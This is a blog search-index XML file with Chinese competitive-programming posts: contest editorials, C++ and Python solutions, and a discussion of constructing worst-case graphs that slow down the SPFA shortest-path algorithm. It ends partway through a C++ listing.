<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[「LYOI 2018」NOIP Easy Round solution]]></title>
    <url>%2Farticles%2FNOIP-Easy-Round-solution%2F</url>
    <content type="text"><![CDATA[思维难度: noiplus 提高组 T3代码实现难度: noip pj-你可以把 yh 的矿场抽象成⼀条数轴。 yh 家有 nnn 种矿，第 iii 种矿可以从 [li,ri][l_i,r_i][l​i​​,r​i​​] 中的任意位置开采得到这个暑假， 地理⽼师给了 wyh ⼀个列表： yh 的暑假作业就是收集⻬这些矿⽯（ mdzz 地理中考都考完了）。但是膜法师 shq 为了不让 yh 完成作业，就将好多个地⽅放置了⻘蛙。为了保证 yh 的⽣命安全， yh 通过阅读书籍选定了 mmm 个相对安全的采矿点，第 iii 个采矿点的坐标为 aia_ia​i​​ 。 yh 只能选择其中⼀个采矿点开采他需要的矿⽯yh是⼀个⻢⻁的男孩⼦。暑假刚开始没多久， yh 就把⽼师的列表弄丢了。唯⼀的线索是，列表上的所有矿⽯都是 yh 家有的：⼀共有 2n−12^{n-1}2​n−1​​ 种可能的列表yh 现在想要知道，在所有的可能的任务列表中，有多少种是他能够在某⼀个安全的采矿点完全收集⻬的题解我们先来看看样例（采矿点 - 1 可以采到 矿石 - 3 和 矿石 - 2，采矿点 - 2 可以采到 矿石 - 3 和 矿石 - 1所以可能的序列有(注意：一个点也需要统计){1} , {2} , {3} , {1, 2} , {2, 3}，共五种（20 pts 做法n,m≤20n, m \le 20n,m≤20我会枚举全排列！ 每次 O(m)O(m)O(m) 暴力判断即可（时间复杂度: O(2nm)O(2^nm)O(2​n​​m)60 pts 做法O(n×m)O (n \times m)O(n×m)我会容斥！100 pts 做法..这个是区间题目吧= = 好像大部分区间题目都要排序（安装左端点排序.....但是我们的采矿点怎么办呢？我好像学过一个叫做最小表示法的算法....将每一段区间的左右端点和采矿点排序对于左右端点分别标记 111, 222，采矿点标记 333我们接下来扫一遍就可以了问题来了，怎么统计答案呢= =我们定义 sss 为当前可以采到的矿的数量，tottottot 为已经统计过的区间那么，每次扫到新的采矿点的时候 我们让 ans+=2s−2totans += 2^s - 2^{\text{tot}}ans+=2​s​​−2​tot​​这个结论是比较显然的，用小学数学组合数推导一下就有了（Code1234567891011for each v in Point set: if v is 1: s++ pos[v-&gt;pos] = last if v is 2: s-- if pos[v-&gt;pos] not last then tot-- if v is 3: ans += pow(2, s) - pow(2, tot) tot = s last = i]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>LYOI</tag>
        <tag>NOIP</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>最小表示法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「CQOI2018」九连环]]></title>
    <url>%2Farticles%2FCQOI2018-%E4%B9%9D%E8%BF%9E%E7%8E%AF%2F</url>
    <content type="text"><![CDATA[题目链接 [CQOI2018]九连环题目背景九连环是一种源于中国的传统智力游戏。如图所示，九个的圆环套在一把“剑”上，并且互相牵连。游戏的目标是把九个圆环全部从“剑”上卸下题目描述圆环的装卸需要遵守两个规则:第一个(最右边) 环任何时候都可以任意装上或卸下如果第 kkk 个环没有被卸下，且第 kkk 个环右边的所有环都被卸下，则第 k+1k+1k+1 个环(第 kkk 个环左边相邻的环) 可以任意装上或卸下与魔方的千变万化不同，解九连环的最优策略是唯一的。为简单起见，我们以“四连环”为例，演示这一过程。这里用 111 表示环在“剑”上，000 表示环已经卸下。初始状态为 1111 ,每步的操作如下:1101 (根据规则2,卸下第 2 个环)1100 (根据规则1,卸下第 1 个环)0100 (根据规则2,卸下第 4 个环)0101 (根据规则1,装上第 1 个环)0111 (根据规则2,装上第 2 个环)0110 (根据规则1,卸下第 1 个环)0010 (根据规则2,卸下第 3 个环)0011 (根据规则1,装上第 1 个环)0001 (根据规则2,卸下第 2 个环)0000 (根据规则1,卸下第 1 个环)由此可见，卸下“四连环”至少需要 101010 步。随着环数增加，需要的步数也会随之增多。例如卸下九连环，就至少需要 341341341 步。请你计算，有 nnn 个环的情况下，按照规则， 全部卸下至少需要多少步。输入输出格式输入格式输入文件第一行，为一个整数 mmm，表示测试点数目。接下来 mmm 行，每行一个整数 nnn输出格式输出文件共m行，对应每个测试点的计算结果输入输出样例输入样例12343359输出样例123521341说明对于 10%10\%10% 的数据，1≤n≤101\le n\le 101≤n≤10对于 30%30\%30% 的数据，1≤n≤301\le n\le 301≤n≤30对于 100%100\%100% 的数据，1≤n≤105,1≤m≤101\le n\le 10^5,1\le m\le 101≤n≤10​5​​,1≤m≤10题解水题水题用爆搜简单的打一个表n123456712510214285会发现一个简单的式子我们用 f[i] 表示 iii 连环最少需要的步数1234567f[1] = 1for i = 2 to n if i &amp; 1 then do f[i] = 2 * f[i - 1] else do f[i] = 2 * f[i - 1] + 1 end if我们打一下这个的二进制:n1234567125102142851101011010101011010101010101这样珂海星但是我们看到了二进制表示也对题目没什么帮助（我们将两个相邻的变量相加n1+22 + 33 + 44 + 55 + 66 + 77 + 811111111111111111111111111111111111所以说fn+fn+1=2n+1fn+2fn+(!n&amp;1)=2n+1fn=⌊2n+13⌋\begin{aligned}f_n+f_{n+1}&amp;=2^{n+1}\\f_n+2f_n+(!n\&amp;1)&amp;=2^{n+1}\\f_n&amp;=\lfloor\frac{2^{n+1}}{3} \rfloor\end{aligned}​f​n​​+f​n+1​​​f​n​​+2f​n​​+(!n&amp;1)​f​n​​​​​=2​n+1​​​=2​n+1​​​=⌊​3​​2​n+1​​​​⌋​​接下来我们用快速幂就可以了= =等等..取模呢QAQ不取模会崩掉吧高精会T死（我们还是老老实实打个FFT吧（，不会的同学可以看看 「数学」FFT / DFT / IDFT学习笔记代码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146// Code From: https://www.cnblogs.com/RabbitHu/p/BZOJ5300.html#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;cmath&gt;#include &lt;algorithm&gt;#include &lt;iostream&gt;#define enter putchar('\n')#define space putchar(' ')using namespace std;typedef long long ll;template &lt;class T&gt;void read(T &amp;x)&#123; char c; bool op = 0; while(c = getchar(), c &lt; '0' || c &gt; '9') if(c == '-') op = 1; x = c - '0'; while(c = getchar(), c &gt;= '0' &amp;&amp; c &lt;= '9') x = x * 10 + c - '0'; if(op == 1) x = -x;&#125;template &lt;class T&gt;void write(T x)&#123; if(x &lt; 0) putchar('-'), x = -x; if(x &gt;= 10) write(x / 10); putchar('0' + x % 10);&#125;const int N = 150000;const double PI = acos(-1);int T, x;struct cp &#123; double a, b; cp()&#123;&#125; cp(double x, double y): a(x), b(y)&#123;&#125; cp operator + (const cp &amp;obj) const &#123; return cp(a + obj.a, b + obj.b); &#125; cp operator - (const cp &amp;obj) const &#123; return cp(a - obj.a, b - obj.b); &#125; cp operator * (const cp &amp;obj) const &#123; return cp(a * obj.a - b * obj.b, a * obj.b + b * obj.a); &#125;&#125; inv[N], omg[N];void init(int n)&#123; for(int i = 0; i &lt; n; i++)&#123; omg[i] = cp(cos(2 * PI / n * i), sin(2 * PI / n * i)); inv[i] = cp(omg[i].a, -omg[i].b); &#125;&#125;void fft(cp *a, int n, cp *omg)&#123; int lim = 0; while((1 &lt;&lt; lim) &lt; n) lim++; for(int i = 0; i &lt; n; i++)&#123; int t = 0; for(int j = 0; j &lt; lim; j++) if(i &gt;&gt; j &amp; 1) t |= 1 &lt;&lt; (lim - j - 1); if(i &lt; t) swap(a[i], a[t]); &#125; for(int l = 2; l &lt;= n; l &lt;&lt;= 1)&#123; int m = l / 2; for(cp *p = a; p != a + n; p += l) for(int i = 0; i &lt; m; i++)&#123; cp t = omg[n / l * i] * p[i + m]; p[i + m] = p[i] - t; p[i] = p[i] + t; &#125; &#125;&#125;struct big &#123; int g[N], len; big()&#123; memset(g, 0, sizeof(g)); len = 1; &#125; big(int x)&#123; memset(g, 0, sizeof(g)); len = 0; if(!x)&#123; len = 1; return; &#125; while(x) g[len++] = x % 10, x /= 10; &#125; void out()&#123; for(int i = len - 1; i &gt;= 0; i--) printf("%d", g[i]); enter; &#125; void operator /= (int x)&#123; int sum = 0, newlen = 0; for(int i = len - 1; i &gt;= 0; i--)&#123; sum = sum * 10 + g[i]; if(sum &lt; x) g[i] = 0; else&#123; if(!newlen) newlen = i + 1; g[i] = sum / x; sum %= x; &#125; &#125; len = max(newlen, 1); &#125; void operator *= (const big &amp;b)&#123; static cp A[N], B[N]; int newlen = len + b.len - 1, n = 1; while(n &lt; newlen) n &lt;&lt;= 1; for(int i = 0; i &lt; n; i++)&#123; A[i] = cp(i &lt; len ? g[i] : 0, 0); B[i] = cp(i &lt; b.len ? b.g[i] : 0, 0); &#125; init(n); fft(A, n, omg); fft(B, n, omg); for(int i = 0; i &lt; n; i++) A[i] = A[i] * B[i]; fft(A, n, inv); for(int i = 0; i &lt; newlen; i++) g[i] = (int)floor(A[i].a / n + 0.5); g[len = newlen] = 0; for(int i = 0; i &lt; len; i++) g[i + 1] += g[i] / 10, g[i] %= 10; if(g[len]) len++; &#125;&#125; ret, a;int main()&#123; read(T); while(T--)&#123; read(x), x++; ret = big(1), a = big(2); while(x)&#123; if(x &amp; 1) ret *= a; a *= a; x &gt;&gt;= 1; &#125; ret /= 3; ret.out(); &#125; return 0;&#125;然后就完了吗？没有窝之前好像在 「数学」FFT / DFT / IDFT学习笔记 的开头放了一段AC Code每次，既然是高精，有是简单的式子为什么还要写FFT呢？Python大法好！AC Code:1for i in range(int(input())) : print(pow(2, int(input()) + 1) // 3)]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>CQOI</tag>
        <tag>高精</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「SPFA」如何优雅的卡掉SPFA]]></title>
    <url>%2Farticles%2Fhack-spfa%2F</url>
    <content type="text"><![CDATA[201820182018 年 777 月 191919 日，某位同学在 NOI Day1 T1\text{NOI Day1 T1}NOI Day1 T1 归程 一题里非常熟练地使用了一个广为人知的算法求最短路。然后呢？100→60,Ag→Cu100 \rightarrow 60, Ag \rightarrow Cu100→60,Ag→Cu最终，他因此没能与理想的大学达成契约相信大家只要学过 OI\text{OI}OI 的人都知道 SPFA\text{SPFA}SPFA 求最短路吧（SPFA\text{SPFA}SPFA 代码简洁，简单易懂，是初学者学习最短路最好的算法 QAQ毫无优化的 SPFA\text{SPFA}SPFA 代码:12345678910111213141516171819202122232425262728inline int spfa(const int &amp;s,const int &amp;t,const int &amp;n)&#123; for (int i = 1; i &lt;= n; i++)&#123; node[i].dist = inf; node[i].inQueue = false; &#125; queue&lt;Node *&gt; q; q.push(&amp;node[s]); node[s].dist = 0; node[s].inQueue = true; while(!q.empty())&#123; Node *u = q.front(); q.pop(); u-&gt;inQueue = false; for(Edge *e = u-&gt;firstEdge; e; e = e-&gt;next)&#123; Node *v = e-&gt;t; if(v-&gt;dist &gt; u-&gt;dist + e-&gt;w)&#123; v-&gt;dist = u-&gt;dist + e-&gt;w; if(!v-&gt;inQueue)&#123; q.push(v); v-&gt;inQueue = true; &#125; &#125; &#125; &#125; return node[t].dist;&#125;// spfa(start, end, n)多么简洁..多么好看....多么..算了窝编不下去惹 QAQ其实 SPFA\text{SPFA}SPFA 是来用一个假复杂度顶替 Bellman-Ford\text{Bellman-Ford}Bellman-Ford 的名字Hack SPFA我们先来看看常见的卡 SPFA\text{SPFA}SPFA 的方法构造网格图这个是最基础的卡掉 SPFA\text{SPFA}SPFA 的方法（但是最基础的网格图也能卡掉 80%80\%80% 的 SPFA\text{SPFA}SPFA网格图是如何卡 SPFA\text{SPFA}SPFA 的呢， 因为在网格图中走错一次路可能导致很高的额外开销 QAQCode12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;bits/stdc++.h&gt;using namespace std;struct edge &#123; int u, v, w; &#125;;vector&lt;edge&gt; v;int id[5000][5000], n = 9, tp, m = 42866 / n, a[1000000];int r() &#123; return(rand() ); /* return rand()&lt;&lt;13|rand(); */&#125;int main () &#123; freopen( "in.txt", "w", stdout ); srand( time( 0 ) ); for ( int i = 1; i &lt;= n; ++i ) for ( int j = 1; j &lt;= m; ++j ) id[i][j] = ++tp, a[tp] = tp;/* random_shuffle(a+1,a+tp+1); */ int SIZE = 29989; for ( int i = 1; i &lt;= n; ++i ) for ( int j = 1; j &lt;= m; ++j ) &#123; if ( i &lt; n ) &#123; v.push_back( edge &#123; id[i][j], id[i + 1][j], 1 &#125; ); v.push_back( edge &#123; id[i + 1][j], id[i][j], 1 &#125; ); if ( j &lt; m ) &#123; if ( 1 ) v.push_back( edge &#123; id[i][j], id[i + 1][j + 1], r() % SIZE + 10 &#125; ); else v.push_back( edge &#123; id[i + 1][j + 1], id[i][j], r() % SIZE + 10 &#125; ); &#125; &#125; if ( j &lt; m ) &#123; v.push_back( edge &#123; id[i][j], id[i][j + 1], r() % SIZE + 10 &#125; ); v.push_back( edge &#123; id[i][j + 1], id[i][j], r() % SIZE + 10 &#125; ); &#125; &#125; fprintf( stderr, "[%d,%d,%d]", v.size(), n, m ); random_shuffle( v.begin(), v.end() );/* printf("%d %d %d\n",tp,v.size(),2); */ printf( "%d %d\n", tp, v.size() ); for ( int i = 0; i &lt; v.size(); ++i ) printf( "%d %d %d\n", a[v[i].u], a[v[i].v], v[i].w );/* * for(int i=1;i&lt;=10;++i)printf("%d ",a[id[1][10*i]]); * printf("%d %d",a[1],a[2]); */&#125;链套菊花这样会使得队列更新菊花的次数非常高 QAQ介绍完了几种常见的卡 SPFA\text{SPFA}SPFA 的方法，我们再来看一下 SPFA\text{SPFA}SPFA 的几种优化 极其分别如何Hack （LLL 优化方法 &amp; 原理设队首元素为 iii ，每次弹出时进行判断，队列中所有 distdistdist 值的平均值为 xxx ，若 dist(i)&gt;xdist(i)&gt;xdist(i)&gt;x 则将 iii 插入到队尾，查找下一元素，直到找到某一i使得 dist(i)≤xdist(i)\le xdist(i)≤x，则将i出对进行松弛操作Hack对于单纯的平均值我们可以直接构造极端值来卡 QAQ向 111 连接一条权值巨大的边，这样 LLL\text{LLL}LLL 就失效了SLF 优化方法 &amp; 原理设要加入的节点是 jjj ，队首元素为 iii，若 dist(j)&lt;dist(i)dist(j) &lt; dist(i)dist(j)&lt;dist(i)，则将j插入队首，否则插入队尾Hack对于这种优化我们可以采取我们网格图的策略用链套菊花，在链上用几个并列在一起的小边权边就能欺骗算法多次进入菊花，从而时间复杂度巨大 QAQCode这里给一下代码，主要这个是可以同时再用 LLL\text{LLL}LLL 优化的1234567891011121314151617181920212223242526272829303132333435363738394041424344454647char str[maxn][maxn];int vis[maxn][maxn],dis[maxn][maxn],n,m;int ans[30],sum,cnt;int dx[] = &#123;-1,-1,0,1,1,1,0,-1&#125;,dy[] = &#123;0,1,1,1,0,-1,-1,-1&#125;;deque&lt;PII&gt;q;void spfa() &#123; while(!q.empty()) &#123; PII f = q.front();q.pop_front(); //LLL优化 if(dis[f.fi][f.se] * cnt &gt; sum) &#123; q.push_back(f); continue; &#125; sum -= dis[f.fi][f.se]; cnt--; vis[f.fi][f.se] = 0; for( int i = 0; i &lt; 8; i++ )&#123; int nx = f.fi + dx[i],ny = f.se + dy[i]; if(nx &lt; 1 || nx &gt; n || ny &lt; 1 || ny &gt; m)continue; int w = (str[nx][ny] != str[f.fi][f.se]); if(dis[nx][ny] &gt; dis[f.fi][f.se] + w)&#123; dis[nx][ny] = dis[f.fi][f.se] + w; if(!vis[nx][ny])&#123; vis[nx][ny] = 1; //SLF优化 if(dis[nx][ny] &lt; dis[q.front().fi][q.front().se])&#123; q.push_front(mp(nx,ny)); &#125; else &#123; q.push_back(mp(nx,ny)); &#125; sum += dis[nx][ny];cnt++; &#125; &#125; &#125; &#125;&#125;void init() &#123; cl(dis,INF); cl(vis,0); cl(ans,INF); sum = cnt = 0;&#125;容错机制如果我们遇到了小边权，我们可以采用容错机制来防止被 Hack每次将入队结点距离和队首比较的时候，如果比队首大超过一定值 www 则插入至队尾，否则插入队头.这样看起来就无懈可击了（对于这个一定值www，我们最好取w=∑for each edge(u, v, dist)distw = \sqrt {\sum_{\text{for each edge(u, v, dist)}} \text{dist}}w=√​​for each edge(u, v, dist)​∑​​dist​​​Hack 容错机制小边权当然是无解的…..我们分析时间复杂度，显然的是 O((n+m)×w)O((n+m) \times \sqrt w)O((n+m)×√​w​​​)我们直接开大边权即可，比如把 ∑for each edge(u, v, dist)dist\sqrt {\sum_{\text{for each edge(u, v, dist)}} \text{dist}}√​∑​for each edge(u, v, dist)​​dist​​​ 开到 10610^610​6​​SLF + Swap每当队列改变时，如果队首距离大于队尾，则交换首尾这个 SLF 看起来很弱，但却通过了所有 Hack 数据。而且， 非常难卡Hack SLF + Swap然而这个与卡 SLF 类似，外挂诱导节点即可（mcfx 优化方法 &amp; 原理mcfx神犇在第 [l,r][l,r][l,r] 次访问一个结点时，将其放入队首，否则放入队尾。通常取 l=2,r=Vl=2, r=\sqrt Vl=2,r=√​V​​​Hack这个优化在网格图上跑的飞快….但是遇到菊花图就凉了NTR 优化牛头人优化方法 &amp; 原理维护一个叫临时最短路树的东西，刚开始只有一个源节点这 SPFA\text{SPFA}SPFA 的过程中，每次松弛 (u,v)(u, v)(u,v) 边时将 vvv 的父亲设为 uuu ；vvv 是有可能有后代的，所以将其所有后代的对应 inQueue\text{inQueue}inQueue标记清除；在 SPFA\text{SPFA}SPFA 过程中如果发现队头节点的 inQueue\text{inQueue}inQueue 为空那么跳过。理由是如果我们能松弛 (u,v)(u, v)(u,v) 边，那么从 (u,v)(u, v)(u,v) 走势必比以前走过的那种走法好。将这个步骤称为 NTR\text{NTR}NTR随着深度趋近无穷大(真的很大)，NTR\text{NTR}NTR 的频率（频率指 222 次 NTR\text{NTR}NTR 之间需要的 iteration\text{iteration}iteration 数的倒数 也就是说我们把 BFS\text{BFS}BFS 看成是一个前进的过程 一次 iteration\text{iteration}iteration 就是一次前进）趋近于 1logn1\over \log n​logn​​1​​这是一个很糟的结论，不过我们有办法避开它。在迭代过程中强行把一些不能松弛的边 NTR\text{NTR}NTR 一下（目的是破坏子树）就行了，使得频率是 0.50.50.5那么我们知道，NTR\text{NTR}NTR 的 extra\text{extra}extra 时间复杂度为 NTR\text{NTR}NTR 频率 x 顶点数 x NTR\text{NTR}NTR 代价 其中 NTR\text{NTR}NTR 代价是 mnm\over n​n​​m​​（理解这个的话 想象你要 NTR\text{NTR}NTR 出一棵子树，你要积累 222 层...） 然后也就是 0.5×n×mn=0.5×m{0.5\times n\times m\over n}=0.5\times m​n​​0.5×n×m​​=0.5×m上面除了NTR\text{NTR}NTR 操作外我们还看见了 dfsdfsdfs 找儿子操作和 dfsdfsdfs 重置 label\text{label}label 操作，看起来慌得一笔都是 O(m)O(m)O(m) 的 其实这几个的时间和 NTR\text{NTR}NTR 一模一样；时间复杂度 O(nlognlogmn)→O(m+n)O(n\log n \log{m\over n})\to O(m+n)O(nlognlog​n​​m​​)→O(m+n)Code1234567891011121314151617181920212223242526272829inline int SPFA() &#123; int i, j, x, cnt = 0; queue&lt;int&gt; Q; memset(d, 0x3f, sizeof(d)); d[S] = 0; Q.push(S); setv(S, 1); while(!Q.empty()) &#123; x = Q.front(); Q.pop(); cnt ++; if(!query(x)) continue; for(i = 0;i &lt; G[x].size();i ++) &#123; Edge &amp;e = edge[G[x][i]]; if(d[x] + e.w &lt; d[e.v]) &#123; d[e.v] = d[x] + e.w; Q.push(e.v); setc(e.v, 0); setv(e.v, 1); if(lca(e.v, x) == e.v) &#123; return 0; &#125; int f = getfa(e.v); linkcut(f, e.v, x); &#125; &#125; &#125; return 1;&#125;总结人生苦短，慎用SPFA\text{SPFA}SPFA！]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>dijkstra</tag>
        <tag>图论</tag>
        <tag>最短路</tag>
        <tag>SPFA</tag>
        <tag>Hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「2018 五校联考 Round1」题目讲解]]></title>
    <url>%2Farticles%2F2018-%E4%BA%94%E6%A0%A1%E8%81%94%E8%80%83-Round1%2F</url>
    <content type="text"><![CDATA[本文受密码保护密码：t1的输入文件名称（xxxx.in）2018 五校联考 Round1By - infinityedge前排先%%%dzm神仙Day 1A. 骰子Problem A (dice.c/cpp/pas)\text{Problem A (dice.c/cpp/pas)}Problem A (dice.c/cpp/pas)Input file: dice.in Output file: dice.out\text{Input file: dice.in Output file: dice.out}Input file: dice.in Output file: dice.outTime Limit : 1 second Memory Limit: 512 megabytes\text{Time Limit : 1 second Memory Limit: 512 megabytes}Time Limit : 1 second Memory Limit: 512 megabytes有一个 n×mn\times mn×m 的网格，在网格的左上角（第 111 行第 111 列）有一个骰子。骰子的初始状态如下图所示（即上面为 111 ，下面为 666 ，左面为 444 ，右面为 333 ，前面为 222，后面为 555）现在按一定的规则滚动骰子。滚动骰子当然是有轨迹的。你需要从左到右滚动到右端，然后向下滚动一格然后在向左滚动到左端，再向下一格，如此反复，直到所有的格子都被经过为止。你需要计算出骰子到达每个格点（包括初始的格子）时，骰子上方的数字之和Input一行两个整数 n, mOutput一行一个整数表示答案Examplesdice.indice.out3 2193 442114 514205086Notes样例 111 解释：经过每个格子时骰子上面的数字依次为： 1 4 5 1 3 5\text{1 4 5 1 3 5}1 4 5 1 3 5对于 50%50\%50% 的数据，1≤n,m≤1031\le n, m \le 10^31≤n,m≤10​3​​对于 100%100\%100% 的数据，1≤n,m≤1051 \le n, m\le 10^51≤n,m≤10​5​​算法1 - 50 pts一个简单的模拟（时间复杂度 O(n×m)O(n\times m)O(n×m)期望得分： 50 pts\text{50 pts}50 pts算法2 - 100 pts考虑到连续滚动的时候只有四个面接触，且和为 141414 ，我们只需要对于每行先 O(1)O(1)O(1) 处理出循环的部分，剩下的暴力模拟即可qwq（时间复杂度 O(n)O(n)O(n)期望得分： 100 pts\text{100 pts}100 pts这个是真的签到题。。。万人 A ....然而最菜的 Shq 并没有A.....（Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;algorithm&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;map&gt;#include &lt;complex&gt;#define inf 0x3f3f3f3f#define MAXN 131072using namespace std;typedef long long ll;ll n, m, ans;ll s, x, z, y, q, h;void soll() &#123; int t = s; s = y, y = x, x = z, z = t; ans += s;&#125;void solr() &#123; int t = s; s = z, z = x, x = y, y = t; ans += s;&#125;void sold() &#123; int t = s; s = h, h = x, x = q, q = t; ans += s;&#125;int main() &#123; freopen("dice.in", "r", stdin); freopen("dice.out", "w", stdout); ans = s = 1, x = 6, z = 4, y = 3, q = 2, h = 5; scanf("%lld %lld",&amp;n,&amp;m); for(int i = 1; i &lt;= n; i ++)&#123; ans += ((m - 1) / 4) * 14; if(i &amp; 1) for(int j = 1; j &lt;= (m - 1) % 4; j ++) solr(); else for(int j = 1; j &lt;= (m - 1) % 4; j ++) soll(); if(i != n) sold(); &#125; printf("%lld\n", ans); return 0;&#125;B. 子序列Problem B (sub.c/cpp/pas)\text{Problem B (sub.c/cpp/pas)}Problem B (sub.c/cpp/pas)Input file: sub.in Output file: sub.out\text{Input file: sub.in Output file: sub.out}Input file: sub.in Output file: sub.outTime Limit : 1 second Memory Limit: 512 megabytes\text{Time Limit : 1 second Memory Limit: 512 megabytes}Time Limit : 1 second Memory Limit: 512 megabytes给定一个长度为 nnn 的序列 a1,a2,a3⋯ana_1,a_2,a_3\cdots a_na​1​​,a​2​​,a​3​​⋯a​n​​你需要求出有多少对这样的三元组 (i,j,k)(i, j, k)(i,j,k)满足 i&lt;j&lt;ki &lt; j &lt; ki&lt;j&lt;k 并且 ai&lt;aj&lt;aka_i &lt; a_j &lt; a_ka​i​​&lt;a​j​​&lt;a​k​​ 或 ai&gt;aj&gt;aka_i &gt; a_j &gt; a_ka​i​​&gt;a​j​​&gt;a​k​​你只需要求出答案对 109+710^9+710​9​​+7 取模的结果Input第一行为一个整数 nnn第二行为用空格空格隔开的 nnn 个整数，第 iii 个数为 aia_ia​i​​Output一行，表示答案对 109+710^9+710​9​​+7 取模的结果Examplessub.insub.out4 3 1 2 31Notes对于 20%20\%20% 的数据， n≤2×102n \le 2 \times 10^2n≤2×10​2​​对于 50%50\%50% 的数据， n≤2×103n \le 2 \times 10^3n≤2×10​3​​对于另 20%20\%20% 的数据， ai≤4×105a_i \le 4\times10^5a​i​​≤4×10​5​​对于 100%100\%100% 的数据， 3≤n≤2×105,ai≤1093\le n \le 2 \times 10^5, a_i \le 10^93≤n≤2×10​5​​,a​i​​≤10​9​​算法1 - 20 pts比较容易想的一个暴力由于 1≤n≤2001 \le n \le 2001≤n≤200我们就直接暴力枚举 i,j,ki,j, ki,j,k，然后暴力判断是否满足条件qwq（时间复杂度：O(n3)O(n^3)O(n​3​​)期望得分： 20 pts\text{20 pts}20 pts算法2 - 50 pts我们想想怎么做可以让时间复杂度降低枚举中间的数，然后统计左边有多少个数比他小/大，右边有多少个数比他大/小，用乘法原理统计答案期望得分： 50 pts\text{50 pts}50 pts算法3 - 100 pts1≤n≤2000001 \le n\le 2000001≤n≤200000离散化后用树状数组统计即可。 是给不会离散化的人准备的（时间复杂度 O(nlog2n)O(n \log_2 n)O(nlog​2​​n)期望得分： 100 pts\text{100 pts}100 ptsCode123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;bits/stdc++.h&gt;using namespace std;typedef long long ll;const ll mod = 1e9 + 7;int n;int tmp[200005], a[200005];int bit1[200005], bit2[200005];inline int lowbit(int x)&#123; return x &amp; -x;&#125;void add(int *bit, int pos, int v)&#123; for(int i = pos; i &lt;= n; i += lowbit(i))&#123; bit[i] += v; &#125;&#125;int query(int *bit, int pos)&#123; int ret = 0; for(int i = pos; i; i -= lowbit(i))&#123; ret += bit[i]; &#125; return ret;&#125;ll ans = 0;int main()&#123; freopen("sub.in", "r", stdin); freopen("sub.out", "w", stdout); scanf("%d", &amp;n); for(int i = 1; i &lt;= n; i ++)&#123; scanf("%d", &amp;a[i]); tmp[i] = a[i]; &#125; sort(tmp + 1, tmp + n + 1); for(int i = 1; i &lt;= n; i ++)&#123; a[i] = lower_bound(tmp + 1, tmp + n + 1, a[i]) - tmp; add(bit2, a[i], 1); &#125; for(int i = 1; i &lt;= n; i ++)&#123; add(bit2, a[i], -1); ans = (ans + 1ll * query(bit1, a[i] - 1) * (query(bit2, n) - query(bit2, a[i]))) % mod; ans = (ans + 1ll * query(bit2, a[i] - 1) * (query(bit1, n) - query(bit1, a[i]))) % mod; add(bit1, a[i], 1); &#125; printf("%lld\n", ans); return 0;&#125;算法4 - 100 ptsLgy: 这个不是平衡树板子题吗？平衡树搞即可Code代码来自Lgy123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;climits&gt;#include &lt;ctime&gt;#include &lt;algorithm&gt;#include &lt;cstdlib&gt;const int MAXN = 2e5 + 7;const int HA = 1e9 + 7;int a[MAXN];int low[MAXN], up[MAXN];int l2[MAXN], u2[MAXN];struct Node &#123; int val, pri, pos; int size, num; Node *left, *right; void pushUp() &#123; size = num; if (left != NULL) &#123; size += left-&gt;size; &#125; if (right != NULL) &#123; size += right-&gt;size; &#125; &#125;&#125; poor[MAXN &lt;&lt; 2], *tail = poor, *r1, *r2;Node *newNode() &#123; Node *ret = ++tail; ret-&gt;val = 0, ret-&gt;pri = rand(); ret-&gt;size = ret-&gt;num = 1; ret-&gt;left = ret-&gt;right = NULL; return ret;&#125;void leftRotate(Node *&amp;v) &#123; Node *tmp = v-&gt;right; v-&gt;right = tmp-&gt;left; tmp-&gt;left = v; v-&gt;pushUp(), tmp-&gt;pushUp(); v = tmp;&#125;void rightRotate(Node *&amp;v) &#123; Node *tmp = v-&gt;left; v-&gt;left = tmp-&gt;right; tmp-&gt;right = v; v-&gt;pushUp(), tmp-&gt;pushUp(); v = tmp;&#125;void insert(Node *&amp;v, int value, int pos) &#123; if (v == NULL) &#123; v = newNode(); v-&gt;val = value; v-&gt;pos = pos; return; &#125; if (v-&gt;val == value) &#123; v-&gt;num++; v-&gt;pushUp(); return; &#125; if (value &lt; v-&gt;val) &#123; insert(v-&gt;left, value, pos); if (v-&gt;pri &lt; v-&gt;left-&gt;pri) &#123; rightRotate(v); &#125; else v-&gt;pushUp(); &#125; else &#123; insert(v-&gt;right, value, pos); if (v-&gt;pri &lt; v-&gt;right-&gt;pri) &#123; leftRotate(v); &#125; else v-&gt;pushUp(); &#125;&#125;void getLow(Node *v, int value, int &amp;num) &#123; if (v == NULL) return; int s = 0; if (v-&gt;left) &#123; s += v-&gt;left-&gt;size; &#125; if (value &lt; v-&gt;val) &#123; getLow(v-&gt;left, value, num); &#125; else if (value &gt; v-&gt;val) &#123; num += v-&gt;num + s; getLow(v-&gt;right, value, num); &#125; else &#123; num += s; &#125;&#125;void getUp(Node *v, int value, int &amp;num) &#123; if (v == NULL) return; int s = 0; if (v-&gt;right) &#123; s += v-&gt;right-&gt;size; &#125; if (value &gt; v-&gt;val) &#123; getUp(v-&gt;right, value, num); &#125; else if (value &lt; v-&gt;val) &#123; num += v-&gt;num + s; getUp(v-&gt;left, value, num); &#125; else &#123; num += s; &#125;&#125;int main(int argc, char *argv[]) &#123; freopen("sub.in", "r", 